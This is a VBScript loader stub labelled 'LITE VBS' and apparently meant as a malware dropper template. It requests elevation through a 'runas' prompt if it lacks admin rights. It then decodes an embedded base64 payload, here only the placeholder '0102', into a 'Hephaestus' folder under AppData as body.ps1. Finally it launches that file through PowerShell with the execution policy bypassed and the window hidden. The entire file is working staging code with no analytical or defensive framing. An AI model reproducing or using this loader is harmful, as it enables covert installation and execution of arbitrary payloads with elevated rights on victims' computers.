'LITE VBS

Dim bodyX
bodyX="0102"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()
    DecodeBase64ToFile bodyX, GetPS1FilePath
    Run
End Sub

Function GetPS1FilePath()
    Dim fso, shell, scriptPath, destFolder, destPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
    destPath = fso.BuildPath(destFolder, "body.ps1")
    CreateFolder fso, destFolder
    GetPS1FilePath = destPath   
End Function

Sub Run
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
    shell.Run command, 0, True
end sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub


Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
